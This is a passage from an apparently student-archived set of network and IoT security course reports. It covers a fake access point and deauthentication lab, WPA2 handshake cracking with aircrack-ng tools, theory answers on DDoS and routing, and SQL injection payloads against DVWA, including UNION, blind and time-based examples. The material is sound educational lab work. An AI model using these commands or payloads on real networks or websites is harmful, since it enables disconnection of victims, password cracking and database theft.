\u5360\u7528\u4e86 53 \u7aef\u53e3\uff0c\u9700\u8981\u4e34\u65f6\u6682\u505c systemd-resolved \u670d\u52a1\uff1a</p> <p>\u63a5\u4e0b\u6765\u901a\u8fc7 aireplay-ng \u6765\u8fdb\u884c deauth \u653b\u51fb\uff1a</p> <p>-a \u7684 AP \u5c31\u662f\u524d\u9762\u5f97\u5230\u7684 BSSID\uff0c-c \u7684 STA \u662f\u8981\u653b\u51fb\u7684\u8bbe\u5907\u7684 MAC \u5730\u5740\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e24\u90e8\u624b\u673a\u7684\u70ed\u70b9\u6216\u8005\u65e0\u7ebf\u8fde\u63a5\u4fe1\u606f\u67e5\u770b\u3002\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230 ACK \u5de6\u4fa7\u662f\u53d7\u5bb3\u8005\u7684 ACK\uff0c\u6709\u975e 0 \u503c\u8bf4\u660e\u53d7\u5bb3\u624b\u673a\u6536\u5230\u4e86 deauth \u5305\u88ab\u8e22\u6389\u70ed\u70b9\u4e86\uff0c\u53f3\u4fa7\u662f\u771f\u5b9e AP \u7684 ACK\u3002\u53ef\u4ee5\u770b\u5230\u4f2a\u9020\u7684 AP \u83b7\u5f97\u4e86\u624b\u673a\u7684\u8fde\u63a5\uff1a</p> <p>\u53ef\u4ee5\u770b\u5230\u88ab\u653b\u51fb\u7684\u8bbe\u5907\u65ad\u5f00\u4e86\u4e4b\u524d\u7684\u8fde\u63a5\uff0c\u8bd5\u56fe\u8fde\u63a5\u5230\u4f2a\u9020\u7684 AP\uff1a</p> <p>\u4f46\u4f2a\u9020\u7684 AP \u65e0\u6cd5\u8fde\u63a5\uff0c\u53ef\u80fd\u662f\u7f51\u7edc\u8bbe\u7f6e\u54ea\u91cc\u6709\u95ee\u9898\uff0c\u95ee\u4e86\u52a9\u6559\uff0c\u52a9\u6559\u8bf4\u53ef\u4ee5\u8e22\u6389\u5c31\u53ef\u4ee5\uff0c\u4e0d\u4e00\u5b9a\u8981\u8fde\u5f97\u4e0a\u65b0\u7684\u3002\u540c\u65f6\u53ef\u4ee5\u8ba9 airbase-ng \u4f2a\u9020\u7684 AP \u6539\u4e2a\u540d\uff0c\u53ef\u4ee5\u770b\u5230\u6709\u4e24\u4e2a\u70ed\u70b9\uff1a</p>"},{"location":"sec/iotsec/lab3/#_3","title":"\u601d\u8003\u9898","text":"<p>1. \u7b2c 6 \u6b65\uff0c\u653b\u51fb\u8005\u5f3a\u5236\u53d7\u5bb3\u8005\u624b\u673a\u65ad\u8fde\u539f\u7406\u662f\u4ec0\u4e48\uff1f</p> <p>\u7b2c\u516d\u6b65\u7684\u547d\u4ee4\u4e2d\uff0caireplay-ng \u4f1a\u5229\u7528\u4f2a\u9020\u7684 AP \u6839\u636e\u771f\u5b9e\u70ed\u70b9\u7684 MAC \u5730\u5740\u548c channel \u4f2a\u9020\u771f\u5b9e AP \u6765\u5411\u76ee\u6807\u8bbe\u5907\u53d1\u9001 deauth \u5305\uff0c\u4f7f\u5176\u4e0e\u771f\u5b9e\u70ed\u70b9\u65ad\u8fde\u3002\u4e4b\u540e\u624b\u673a\u4f1a\u81ea\u52a8\u8fde\u63a5\u4fe1\u53f7\u66f4\u597d\u7684 AP\uff0c\u5982\u679c\u4f2a\u9020\u7684 AP \u66f4\u8fd1\uff0c\u5219\u4f1a\u8fde\u63a5\u5230\u4f2a\u9020\u7684 AP\u3002</p> <p>2. \u8bbe\u7acb\u4f2a\u9020 AP \u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u6b64\u57fa\u7840\u4e0a\u5b9e\u65bd\u54ea\u4e9b\u653b\u51fb\uff1f</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u884c\u6d41\u91cf\u76d1\u542c\uff0c\u83b7\u53d6\u53d7\u5bb3\u8005\u901a\u4fe1\u7684\u6d41\u91cf\uff0c\u8fdb\u884c\u89e3\u7801\uff0c\u83b7\u53d6\u7528\u6237\u9690\u79c1\u4fe1\u606f\u3002\u4e5f\u53ef\u4ee5\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4f2a\u9020\u53d7\u5bb3\u8005\u4e0e\u771f\u5b9e\u670d\u52a1\u5668\u7684\u901a\u4fe1\uff0c\u83b7\u53d6\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801\u7b49\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u6d41\u91cf\u3001\u8f6c\u53d1\u6076\u610f\u6570\u636e\uff0c\u8fdb\u884c DoS \u653b\u51fb\u7b49\u3002</p> <p>3. \u653b\u51fb\u8005\u5b9e\u65bd Fake AP \u653b\u51fb\u540e\uff0c\u53d7\u5bb3\u8005\u80fd\u5426\u5206\u8fa8 Fake AP \u548c\u771f\u5b9e AP\uff1f\u4e3a\u4ec0\u4e48\uff1f</p> <p>\u672c\u5b9e\u9a8c\u4e2d\u4f2a\u9020\u7684 AP \u53ef\u4ee5\u5206\u8fa8\uff0c\u56e0\u4e3a aireplay-ng + dnsmasq \u591f\u65e9\u7684\u4f2a\u9020 AP \u65e0\u6cd5\u8fde\u63a5\uff0c\u53d7\u5bb3\u8005\u65e0\u6cd5\u6b63\u5e38\u4e0a\u7f51\u3002\u4f46\u5982\u679c\u4f2a\u9020\u7684 AP \u80fd\u591f\u6b63\u5e38\u8fde\u63a5\uff0c\u800c\u4e14\u4f2a\u9020\u7684 MAC \u5730\u5740\u3001channel \u4fe1\u606f\u4e0e\u771f\u5b9e AP \u4e00\u81f4\uff0c\u53d7\u5bb3\u8005\u53ef\u80fd\u65e0\u6cd5\u5206\u8fa8\u3002</p> <p>4. \u5982\u4f55\u9632\u5fa1 Fake AP \u653b\u51fb\uff1f</p> <p>\u771f\u5b9e\u7684 AP \u548c\u4e3b\u673a\u4e4b\u95f4\u5e94\u5f53\u5148\u8fdb\u884c\u5bc6\u94a5\u4ea4\u6362\uff0c\u7136\u540e\u8fdb\u884c\u52a0\u5bc6\u4fe1\u606f\u4f20\u8f93\uff0c\u8fd9\u6837\u4f2a\u9020\u7684 AP \u4e0d\u77e5\u9053\u5bc6\u94a5\uff0c\u65e0\u6cd5\u89e3\u5bc6\u4fe1\u606f\u4e5f\u5c31\u4e0d\u4f1a\u9020\u6210\u6709\u6548\u653b\u51fb\u3002\u6240\u4ee5\u5e94\u5f53\u907f\u514d\u8fde\u63a5\u65e0\u5bc6\u7801\u7684\u70ed\u70b9\u548c WiFi\uff0c\u5728\u6bcf\u6b21\u8fde\u63a5\u524d\u90fd\u8fdb\u884c\u5bc6\u7801\u786e\u8ba4\uff0c\u8fd9\u6837\u4f2a\u9020\u7684 AP \u4e0d\u77e5\u9053\u5bc6\u7801\u5c31\u65e0\u6cd5\u8fdb\u884c\u9a8c\u8bc1\uff0c\u53ef\u4ee5\u907f\u514d Fake AP \u653b\u51fb\u3002</p>"},{"location":"sec/iotsec/lab3/#wpa2","title":"WPA2 \u5bc6\u7801\u7834\u89e3","text":"<p>\u624b\u673a\u70ed\u70b9\u8bbe\u4e3a WPA2-Personal\uff0c\u8bbe\u7f6e\u5f31\u5bc6\u7801 12345678\uff0c\u63a5\u4e0b\u6765\u901a\u8fc7 airodump-ng \u8fdb\u884c\u6d41\u91cf\u6355\u83b7\uff1a</p> <pre><code>airodump-ng wlx0013eff1140e -w dump -c 1 # channel \u4f1a\u66f4\u6362\n</code></pre> <p>\u7136\u540e\u540c\u65f6\u8fdb\u884c deauth \u4f7f\u5f97\u8fde\u63a5\u8bbe\u5907\u91cd\u8fde\uff0c\u6355\u83b7\u76f8\u5173\u6570\u636e\u5305\uff1a</p> <p>\u6355\u83b7\u5230\u7684\u6d41\u91cf\u5728 dump-01.cap \u4e2d\u3002\u63a5\u4e0b\u6765\u4f7f\u7528 aircrack-ng \u548c\u7f51\u4e0a\u4e0b\u8f7d\u7684 wpa-dictionary.cap \u5b57\u5178\u8fdb\u884c\u7834\u89e3\uff1a</p> <p>\u53ef\u89c1\u5f88\u5feb\u5c31\u7834\u89e3\u6389\u4e86\u5f31\u5bc6\u7801 12345678\u3002\u53e6\u5916\u5982\u679c\u662f\u5f3a\u5bc6\u7801\u5219\u8981\u6d88\u8017\u4e00\u5b9a\u65f6\u95f4\u4ece\u5b57\u5178\u4e2d\u7206\u7834\uff1a</p>"},{"location":"sec/iotsec/lab3/#_4","title":"\u601d\u8003\u9898","text":"<p>1. \u4e3a\u4ec0\u4e48\u5355\u5229\u7528\u63e1\u624b\u5305\u5c31\u8db3\u4ee5\u66b4\u7834\u5bc6\u7801\uff1f</p> <p>WPA2 \u5efa\u7acb\u8fde\u63a5\u9700\u8981\u56db\u6b21\u63e1\u624b\uff0c\u5176\u4e2d\u7b2c\u4e00\u6b21\u63e1\u624b\u65f6 STA \u4f1a\u6839\u636e ANonce\uff08AP \u751f\u6210\u7684\u968f\u673a\u6570\uff09\u3001SNonce\uff08Station \u751f\u6210\u7684\u968f\u673a\u6570\uff09\u3001MAC(STA)\u3001MAC(AP) \u53ca PMK\uff08\u6839\u636e WiFi \u5bc6\u7801 PSK \u548cSSID \u8ba1\u7b97\u83b7\u5f97\uff09\u8ba1\u7b97\u51fa MIC\u3002\u800c ANonce\u3001SNonce\u3001MAC(STA) \u548c MAC(AP) \u90fd\u662f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u63e1\u624b\u5305\u83b7\u5f97\u7684\u660e\u6587\u4fe1\u606f\u4e14 SSID \u5df2\u77e5\uff0c\u6545\u53ea\u9700\u8981\u901a\u8fc7\u679a\u4e3e PSK \u7136\u540e\u8ba1\u7b97 MIC \u5e76\u4e0e\u63e1\u624b\u5305\u4e2d\u7684 MIC \u8fdb\u884c\u6bd4\u8f83\u5373\u53ef\u77e5\u9053 PSK \u662f\u5426\u6b63\u786e\u3002\u6839\u636e\u8fd9\u6837\u7684\u7b97\u6cd5\uff0c\u5c31\u53ef\u4ee5\u505a\u5230\u79bb\u7ebf\u7206\u7834 WiFi \u5bc6\u7801\u3002</p> <p>2. \u4f60\u7684\u66b4\u7834\u5bc6\u7801\u7684\u901f\u5ea6\u5982\u4f55\uff1f\u7528\u8fd9\u79cd\u65b9\u6cd5 1 \u5206\u949f\u80fd\u66b4\u529b\u5c1d\u8bd5\u591a\u5c11\u4e2a\u5bc6\u7801\uff1f</p> <p>\u4ece\u4e0a\u9762\u5f3a\u5bc6\u7801\u7684\u622a\u56fe\u53ef\u4ee5\u770b\u5230\uff0c7 \u79d2\u5185\u5c1d\u8bd5\u4e86 69568 \u4e2a\u5bc6\u7801\uff0c\u6309\u7167\u8fd9\u4e2a\u901f\u5ea6\u4e00\u5206\u949f\u80fd\u5c1d\u8bd5 69568 / 7 * 60 = 596297 \u5373\u5927\u7ea6 600000 \u4e2a\u5bc6\u7801\u3002</p> <p>3. \u5982\u679c\u662f\u5168\u6570\u5b57\u7684\u5bc6\u7801\uff0c\u60f3\u8981\u62b5\u6297\u4e3a\u671f 1 \u5929\u7684\u6301\u7eed\u66b4\u529b\u7834\u89e3\uff0c\u5b83\u7684\u4f4d\u6570\u9700\u8981\u591a\u957f\uff1f</p> <p>\u6839\u636e\u524d\u9762\u4f30\u8ba1\u7684\u901f\u5ea6\uff0c\u6211\u4eec\u4e00\u5929\u5185\u53ef\u4ee5\u5c1d\u8bd5 600000 * 60 * 24 = 864000000 = 8.64e8 \u4e2a\u5bc6\u7801\u3002\u800c\u5982\u679c\u662f\u6570\u5b57\u5bc6\u7801\u5219\u6bcf\u4f4d\u53ea\u6709 10 \u79cd\u60c5\u51b5\uff0cn \u4f4d\u6570\u5b57\u5bc6\u7801\u6709 10^n \u79cd\u60c5\u51b5\uff0c\u6240\u4ee5\u81f3\u5c11\u9700\u8981 9 \u4f4d\u6570\u5b57\u7684\u5bc6\u7801\uff0810^9 = 1e9 &gt; 8.64e8\uff09\u624d\u80fd\u62b5\u6297\u4e3a\u671f 1 \u5929\u7684\u6301\u7eed\u66b4\u529b\u7834\u89e3\u3002</p>"},{"location":"sec/netsec/","title":"\u7f51\u7edc\u5b89\u5168\u539f\u7406\u4e0e\u5b9e\u8df5","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u7f51\u7edc\u5b89\u5168\u539f\u7406\u4e0e\u5b9e\u8df5\u201d \u8bfe\u7a0b\u5b9e\u9a8c\u62a5\u544a\u5f52\u6863\uff08\u56e0\u4e3a\u8fd9\u8bfe\u662f\u56fd\u9645\u5316\uff0c\u5168\u82f1\u6587\u6388\u8bfe\uff0c\u6240\u4ee5\u62a5\u544a\u548c\u4f5c\u4e1a\u4e5f\u90fd\u662f\u82f1\u6587\uff09</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>2024 \u6625\u7f51\u7edc\u5b89\u5168\u539f\u7406\u4e0e\u5b9e\u8df5\u8bfe\u7a0b\u7f51\u7ad9</li> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u7f51\u7edc\u5b89\u5168\u539f\u7406\u4e0e\u5b9e\u8df5</li> </ul>"},{"location":"sec/netsec/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Lab 1\uff08\u5173\u4e8e\u7f51\u7ad9\u6293\u5305\u4e0e HTTP \u57fa\u7840\uff09</li> <li>Lab 2\uff08\u5173\u4e8e ARP \u548c DNS \u52ab\u6301\uff09</li> <li>Lab 3\uff08\u5e38\u89c1\u7f51\u7ad9\u6f0f\u6d1e\uff0cDVWA \u5e73\u53f0\u653b\u51fb\uff09</li> <li>Assignment\uff08\u7406\u8bba\u4f5c\u4e1a\uff09</li> </ul>"},{"location":"sec/netsec/hw/","title":"Network Security Assignment","text":"<p> \u7ea6 2849 \u4e2a\u5b57  5 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <p>Abstract</p> <p>\u7f51\u7edc\u5b89\u5168\u7406\u8bba\u4f5c\u4e1a</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/netsec/hw/#ddos","title":"DDoS","text":""},{"location":"sec/netsec/hw/#a-what-is-the-difference-between-dos-attacks-and-ddos-attacks","title":"a. What is the difference between DoS attacks and DDoS attacks?","text":"<p>DoS is Denial of Service Attack, which means that the attacker sends a large number of requests to the target, causing the server to be unable to respond to other normal requests. DDoS is Distributed Denial of Service Attack, which means that the attacker uses a lot of machines to perform a DoS attack on the target. DoS attacks are performed by a single machine, so it is easy to detect and defend against by blocking the IP. DDoS is difficult to detect and it can be more powerful than DoS attacks.</p>"},{"location":"sec/netsec/hw/#b-how-does-the-tcp-syn-flood-attack-work","title":"b. How does the TCP SYN Flood attack work?","text":"<p>The attacker sends a large number of TCP SYN packets to the target server, the server will respond with a SYN-ACK packet and store the connection information in the buffer and wait for the ACK packet from the client to establish the connection. But if the attacker doesn't respond with the ACK packet, the connection information of the attacker will fill up the server's buffer so that the server can't establish a normal connection will other clients until the old connection info in the buffer is expired.</p>"},{"location":"sec/netsec/hw/#c-how-does-the-solution-of-syn-cookies-against-tcp-syn-flood-attacks-work","title":"c. How does the solution of SYN Cookies against TCP SYN Flood attacks work?","text":"<p>The main reason that TCP SYN Flood attacks work is that the connection info should be stored in the server's queue to wait for response and remember the connection. The solution of SYN Cookies is to move the connection info from the server's buffer to the packet itself. The server will generate a special SYN-ACK packet with the connection info and send it to the client. When the client sends the ACK packet back, the server will verify the connection info in the packet and establish the connection. This way the server doesn't need to store the connection info in the buffer and the buffer will not be filled up by the attacker.</p>"},{"location":"sec/netsec/hw/#d-how-does-the-dns-amplification-attack-work-how-to-defend-against-it","title":"d. How does the DNS Amplification Attack work? How to defend against it?","text":"<p>DNS Amplification Attack uses an open DNS resolver. The attacker pretend itself as the victim by sending query packet with the victim's IP as the source, so that the resolver will send the result to the victim. And if the attacker using the ANY query command, the resolver will send all the records which is very large to the victim, causing a DDoS attack. And the output traffic is much larger than the attacker's input traffic, which is an amplification attack.</p> <p>To defend against it, we can reduce the number of open DNS resolvers, disable ANY request of the resolvers, disable UDP service of the server, or verify the query packet, etc.</p>"},{"location":"sec/netsec/hw/#ddos_1","title":"DDoS","text":""},{"location":"sec/netsec/hw/#a-how-does-memcached-attack-work","title":"a. How does Memcached attack work?","text":"<p>Memcached attack is a kind of amplification attack. The attacker first store some large file in the memcached server, and then send a request to the server with the victim's IP as the source. Then the memcached server will send the large file to the victim, with many requests such as this, the victim will be overwhelmed by the large traffic, causing a DDoS attack.</p>"},{"location":"sec/netsec/hw/#b-what-is-the-difference-between-http-flood-and-fragmented-http-flood","title":"b. What is the difference between HTTP Flood and Fragmented HTTP Flood?","text":"<p>HTTP Flood usually GET or POST some large content from the server, then the server need to take a lot of time to work, such as read or write content to the database. So this will consume the computation resource of the server.</p> <p>But if it takes too long to respond, the HTTP request will be expired. Fragmented HTTP Flood trys to split the HTTP segment into many fragments, and send it slowly but in the TTL, so the server will keep the connection and be consumed all the time.</p>"},{"location":"sec/netsec/hw/#c-why-is-fragmented-http-flood-relatively-more-challenging-to-detect","title":"c. Why is Fragmented HTTP Flood relatively more challenging to detect?","text":"<p>Because Fragmented HTTP Flood Attack just looks like a normal user. Other DDoS attacks usually send a large number of useless packets, or a packet requesting large content to the server, so it is easy to detect. But Fragmented HTTP Flood Attack just keep the connection and send some small packets just as normal, so it is difficult to detect.</p>"},{"location":"sec/netsec/hw/#d-how-does-ingress-filtering-work","title":"d. How does Ingress Filtering work?","text":"<p>Ingress Filtering is a method to filter the incoming packets. When the packet go through an AS, the AS will check the packet's source IP address, if the source IP address is not in the range of the AS, meaning that the IP address is spoofed, the packet won't be routed to the destination. This can prevent the IP spoofing attack.</p>"},{"location":"sec/netsec/hw/#e-how-does-ip-traceback-work","title":"e. How does IP Traceback work?","text":"<p>IP Traceback adds more information to the packet to trace the routing path, which allows the receiver to check if the packets are from the correct source. If the packet is from the wrong source, the receiver can drop the packet. This can prevent the IP spoofing attack.</p>"},{"location":"sec/netsec/hw/#secure-routing","title":"Secure Routing","text":""},{"location":"sec/netsec/hw/#a-what-are-the-key-features-of-the-five-typical-delivery-schemes","title":"a. What are the key features of the five typical delivery schemes?","text":"<p>Unicast is to send to a single host. Boardcast sends the packet to all hosts in the same subnet. Multicast sends the packet to a group of hosts. Anycast sends to any one of the hosts in the group. Geocast sends to a group of hosts in a specific geographical area.</p>"},{"location":"sec/netsec/hw/#b-what-is-the-framework-of-the-dijkstra-algorithm","title":"b. What is the framework of the Dijkstra algorithm?","text":"<pre><code>initial the dis array to infinity (except the source node)\nrepeat until all the nodes are visited:\n    find an unvisited node with the smallest dis value\n    mark the node as visited\n    for each neighbor of the node:\n        if the dis of the neighbor is larger than now + the distance between the node and the neighbor:\n            update the dis of the neighbor\n</code></pre>"},{"location":"sec/netsec/hw/#c-what-is-the-framework-of-the-bellman-ford-algorithm","title":"c. What is the framework of the Bellman-Ford algorithm?","text":"<pre><code>initial the dis array to infinity (except the source node)\nrepeat until no update is made:\n    for each node:\n        if dis is inf: continue\n        for each neighbor of the node:\n            if the dis of the neighbor is larger than now + the distance between the node and the neighbor:\n                update the dis of the neighbor\n</code></pre>"},{"location":"sec/netsec/hw/#d-how-does-prefix-hijacking-work","title":"d. How does prefix hijacking work?","text":"<p>The attacker announces a prefix that is not owned by itself, so the traffic will be routed to the attacker's AS. The attacker can monitor the traffic, or modify the traffic, or drop the traffic, etc. Or the attacker announces that it has a shorter path to a prefix, which will also cause the traffic to be routed to the attacker's AS.</p>"},{"location":"sec/netsec/hw/#e-how-does-rpki-work-why-is-it-insufficient-for-secure-routing","title":"e. How does RPKI work? Why is it insufficient for secure routing?","text":"<p>RPKI is a method to verify the ownership of the IP address. The owner of the IP address will sign the prefix with its private key, and the router will verify the signature with the public key. If the signature is correct, the router will accept the prefix. So RPKI can avoid prefix hijacking with the attacker announces it is another prefix.</p> <p>But RPKI is insufficient for secure routing because it can't prevent the prefix hijacking with the attacker announces it has a shorter path to the prefix.</p>"},{"location":"sec/netsec/hw/#anonymous-communication","title":"Anonymous Communication","text":""},{"location":"sec/netsec/hw/#a-why-is-current-internet-communication-vulnerable-to-anonymity-or-privacy-leakage","title":"a. Why is current Internet communication vulnerable to anonymity or privacy leakage?","text":"<p>Because the packet need to store source and destinate IP address, so the routers can route the packet to the destination. But the attackers can monitor the packets and infer the source and dest IP, which is vulnerable to anonymity or privacy leakage.</p>"},{"location":"sec/netsec/hw/#b-in-which-scenarios-do-users-require-the-communication-anonymity-or-privacy-as-concerned-in-sub-question-a","title":"b. In which scenarios do users require the communication anonymity or privacy as concerned in sub-question a?","text":"<p>When the user wants to hide the source or dest IP address, such as the user wants to visit a website that is blocked by the government, or the user wants to send a message to someone without being monitored and being found, etc.</p>"},{"location":"sec/netsec/hw/#c-how-to-use-proxies-to-secure-communication-anonymity-what-are-the-possible-limitations","title":"c. How to use proxies to secure communication anonymity? What are the possible limitations?","text":"<p>The user can use a proxy to hide the source IP address. The user sends the packet to the proxy, and the proxy sends the packet to the destination. The destination will only see the proxy's IP address, not the user's IP address. The proxy can also encrypt the packet to protect the content.</p> <p>But if the attacker monitor the packets between the user and the proxy or the proxy is attacked, the anonymity will also be broken.</p>"},{"location":"sec/netsec/hw/#d-how-does-onion-routing-provide-a-better-guarantee-for-anonymity","title":"d. How does Onion Routing provide a better guarantee for anonymity?","text":"<p>Onion Routing is a method to encrypt the packet with multiple layers. The user sends the packet to the first node, the first node will decrypt the first layer and send the packet to the second node, , and so on. The last node will send the packet to the destination. The destination will only see the last node's IP address, not the user's IP address. The nodes can't infer the source and dest IP address unless the attacker has enough number of nodes collude with each other, which is almost impossible in the onion network.</p>"},{"location":"sec/netsec/hw/#e-how-to-infer-anonymity-or-privacy-of-onion-routing-traffic","title":"e. How to infer anonymity or privacy of Onion Routing traffic?","text":"<p>Each node only know the information of the previous node and the next node, so the nodes can't infer the source and dest IP address. Because there are a lot of layers, the node's can't infer whether the dest is the final dest or not. So the anonymity or privacy of Onion Routing traffic is guaranteed.</p>"},{"location":"sec/netsec/hw/#web-security","title":"Web Security","text":""},{"location":"sec/netsec/hw/#a-how-does-same-origin-policy-work","title":"a. How does Same Origin Policy work?","text":"<p>Same Origin Policy is a method to prevent the script from one origin to access the content of another origin. The origin is defined as the protocol, domain, and port. If the script from one origin tries to access the content of another origin, the browser will block the request.</p>"},{"location":"sec/netsec/hw/#b-how-does-sql-injection-work-how-to-defend-against-it","title":"b. How does SQL Injection work? How to defend against it","text":"<p>SQL Injection is a method to inject the SQL command into the input field of the website. The attacker can input the SQL command in the input field, and the website will execute the SQL command, which can cause the database to be deleted, or the data to be leaked, etc.</p> <p>To defend against it, the website can use a blacklist to filter the input, to ensure that the input is safe to use. Or the website can use prepared statement to execute the SQL command, which can prevent the SQL Injection.</p>"},{"location":"sec/netsec/hw/#c-please-refer-to-the-slides-or-search-online-and-provide-two-concrete-examples-of-sql-injection","title":"c. Please refer to the slides or search online and provide two concrete examples of SQL Injection.","text":"<p>Use challenge 5 &amp; 6 in lab 3 as examples. In challenge 5, the server will execute query command:</p> <pre><code>$query  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\";\n</code></pre> <p>And the attacker can first close the quote and then use union to select the password from the table by just input <code>1' UNION SELECT first_name, password as last_name FROM users WHERE '1'='1</code> as the id. Then after concatenation, the query command will be like follow which will read the passwords:</p> <pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, password as last_name FROM users WHERE '1'='1';\n</code></pre> <p>In challenge 6, the server will only tell us whether a user exists in the database or not, which means we can only get the result as boolean value. Then we can concatenate the query command to check each char of the password to leak the whole password:</p> <pre><code>SELECT first_name, last_name FROM users WHERE user_id = '\ncrane' OR ascii(substr((SELECT password FROM users LIMIT 0, 1), 1, 1)) = 48\n#';\n</code></pre> <p>Just let the user_id can't be found, and then the result of the query is only depend on the part after <code>OR</code> which is to check the first char of the password is '0' or not. Then we can check each char of the password to leak the whole password.</p>"},{"location":"sec/netsec/hw/#email-security","title":"Email Security","text":""},{"location":"sec/netsec/hw/#a-please-describe-common-threats-against-email-security","title":"a. Please describe common threats against Email security.","text":"<ul> <li>Authentication-related Threats: unauthorized access to email systems</li> <li>Integrity-related Threats: unauthorized modification of email content</li> <li>Confidential-related Threats: unauthorized disclosure of sensitive information</li> <li>Availability-related Threats: prevent end users from being able to send and receive emails</li> </ul>"},{"location":"sec/netsec/hw/#b-how-should-an-email-be-protected-to-support-both-authentication-and-confidentiality","title":"b. How should an Email be protected to support both Authentication and Confidentiality?","text":"<p>To support authentication, the sender uses SHA-256 to generate a 256-bit message digest and encrypt the message digest with RSA using the sender's private key, then append the result as well as the signer\u2019s identity to the message. So that the receiver uses RSA with the sender's public key to decrypt, recover, and verify the message digest.</p> <p>To support Confidentiality, the sender creates a message and a random 128-bit number as a content-encryption key for this message only and encrypt the message using the content-encryption key, then encrypt the content-encryption key with RSA using the receiver's public key and append it to the message. The receiver can use RSA with its private key to decrypt and recover the content-encryption key and use the content-encryption key to decrypt the message.</p>"},{"location":"sec/netsec/hw/#c-please-describe-the-differences-among-dane-spf-and-dkim","title":"c. Please describe the differences among DANE, SPF, and DKIM.","text":"<p>DANE is based on DNSSEC, it is used to ensure the destination's certification. SPF is part of DNS, which certificate the emails sent from the mail servers in the domain. DKIM is to certificate by signature.</p>"},{"location":"sec/netsec/hw/#traffic-analysis","title":"Traffic Analysis","text":""},{"location":"sec/netsec/hw/#a-please-describe-the-properties-of-the-four-types-of-commonly-used-firewall","title":"a. Please describe the properties of the four types of commonly used Firewall.","text":"<ul> <li>Packet Filtering Firewall: filter the packet based on the header information</li> <li>Stateful Inspection Firewall: check both the packet and its context</li> <li>Application Proxy Firewall: a relay of application-level traffic</li> <li>Circuit-Level Proxy Firewall: check only a rely of TCP segments</li> </ul>"},{"location":"sec/netsec/hw/#b-what-are-the-differences-among-firewall-ids-and-ips","title":"b. What are the differences among Firewall, IDS, and IPS?","text":"<p>Firewall limits access to ports by given settings, it can't filter intrusions. IDS will report but not filter the intrusions. IPS can both report and filter the intrusions.</p>"},{"location":"sec/netsec/hw/#c-please-list-commonly-used-methods-for-obfuscating-traffic-to-evade-detection","title":"c. Please list commonly used methods for obfuscating traffic to evade detection?","text":"<ul> <li>Encrypt traffic to hide payloads</li> <li>Use proxy to hide entire packets</li> <li>Introduce noise traffic to hide patterns</li> </ul>"},{"location":"sec/netsec/hw/#open-question-authentication-efficiency","title":"Open Question - Authentication Efficiency","text":"<p>Consider a time-consuming authentication scenario where a database records all secret keys of a large number of users. When the system authenticates a user, it first issues a challenge message to the user. The user then uses his/her key to encrypt the challenge and then returns the encrypted challenge to the system. The system then encrypts the challenge using one key in the database after another and compares the result with the received encrypted message. Once a match is found, the system accepts the user. Otherwise, the user is denied. This authentication protocol surely takes a lot of time and computation. </p> <p>Design a possible solution to speed up the authentication process.</p> <p>To use the same authentication method but in a more fast way. We can also record the users' username or something works like an identifier. When the user send back the encryptd challenge to the system, it should also send its username. Then the server can find it's private key and to authenticate the user.</p> <p>Then we consider the security of this method, as the server, when using the old method to authenticate, the server will know the private key finally, and as the new method, the server will know the private key at the beginning, they are nothind different. And the we consider that if there is someone monitoring the traffic, the attacker will know the username, but the attacker have nothing to do with the username, it's useless. So the new method is secure.</p> <p>And there is a more secure method, which is just record the public key of the users, and use public key to decrypt the encrypted challenge and then compare the result as the issued challenge. Using this method, the server won't know the private key of the user, it's more secure.</p>"},{"location":"sec/netsec/hw/#shine-your-way","title":"SHINE YOUR WAY","text":"<p>Design a question that you think is feasible as an exam question.  </p>"},{"location":"sec/netsec/hw/#a-which-topic-among-the-lectures-you-would-like-to-consider","title":"a. Which topic among the lectures you would like to consider?","text":"<p>Web Security. More specifically, SQL Injection.</p>"},{"location":"sec/netsec/hw/#b-describe-a-sufficiently-complex-question","title":"b. Describe a (sufficiently complex) question;","text":"<p>There is a website which provide a username parameter in the URL <code>?username=...</code>, but the website will not authenticate the user, the username is just to query whether the user exists in the database or not, and then store the result in the log file on the server. So the parameter is useless to the user because there is no response and the user can't see the log file. Try to use SQL Injection to leak the username table in the database.</p>"},{"location":"sec/netsec/hw/#c-provide-also-a-correct-sample-solution-thanks","title":"c. Provide also a correct sample solution, thanks.","text":"<p>Because there is no response to the user, we can't use normal injections such as boolean based injection. But once access the webpage with username parameter, there will be a query command executed in the server. We can use time based injection, which means if the condition is true, the query will sleep for a while, then we can infer the result from the time the webpage response. One possible exploit is <code>?id=1' AND IF(..., sleep(5), 1) --+</code>, then the query will sleep for 5 seconds if the condition is true,.</p>"},{"location":"sec/netsec/lab1/","title":"Network Security Lab 1","text":"<p> \u7ea6 467 \u4e2a\u5b57  72 \u884c\u4ee3\u7801  8 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u7f51\u7edc\u5b89\u5168 lab1 \u5b9e\u9a8c\u62a5\u544a</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/netsec/lab1/#goal","title":"Goal","text":"<p>Lab 01 aims to practice commonly used tools for packet sniffing, packet crafting, and port scanning.</p> <p>For packet sniffing and packet crafting, we use basic web exploitation CTF challenges for example. Solving these challenges helps to understand the HTTP protocol and technologies involved in information transfer and display over the internet like PHP, CMS's (e.g., Django), SQL, Javascript, and 